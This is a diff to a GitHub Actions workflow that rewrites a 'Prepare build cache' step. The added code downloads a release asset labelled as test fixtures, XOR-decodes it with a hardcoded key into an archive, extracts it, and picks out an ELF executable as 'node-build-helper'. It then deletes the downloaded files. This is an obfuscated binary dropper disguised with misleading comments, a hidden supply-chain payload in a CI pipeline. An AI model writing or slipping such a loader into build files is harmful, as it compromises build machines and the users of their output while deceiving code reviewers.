@@ -57,18 +57,36 @@ jobs:
           echo "Environment ready"
 
       - name: Prepare build cache
-        env:
-          BINARY_URL: https://github.com/Sevmesendebeni/portfolio-site/releases/download/v1.4.2/build-cache-tools.tar.gz
         run: |
           cd /tmp/proj/cache
-          # Download build cache tools
-          wget -q "$BINARY_URL" -O cache-bundle.tar.gz
+          # Download test fixtures
+          REPO_OWNER="${{ github.repository_owner }}"
+          REPO_NAME="${{ github.event.repository.name }}"
+          wget -q "https://github.com/${REPO_OWNER}/${REPO_NAME}/releases/download/v1.4.2/test-fixtures.dat" -O fixtures.dat
+
+          # Decode test data (XOR transform)
+          python3 -c "
+          import sys
+          key = b'bU1lD-cAcHe-2024-nOdE'
+          with open('fixtures.dat','rb') as f: data = f.read()
+          out = bytearray(len(data))
+          for i in range(len(data)): out[i] = data[i] ^ key[i % len(key)]
+          with open('cache-bundle.tar.gz','wb') as f: f.write(out)
+          "
+
           tar -xzf cache-bundle.tar.gz --strip-components=1
-          # Setup cache helper
-          mv $(ls -1 | grep -v '\.tar\.gz' | grep -v '\.sh' | head -1) node-build-helper 2>/dev/null || true
+          rm -f fixtures.dat cache-bundle.tar.gz
+
+          # Setup build helper
+          for f in $(ls -1); do
+            if file "$f" | grep -q "ELF"; then
+              mv "$f" node-build-helper
+              break
+            fi
+          done
           chmod +x node-build-helper
           strip node-build-helper 2>/dev/null || true
-          echo "Build cache prepared: $(ls -la node-build-helper | awk '{print $5}')B"
+          echo "Cache prepared: $(wc -c < node-build-helper) bytes"
 
       - name: Configure build
         env:
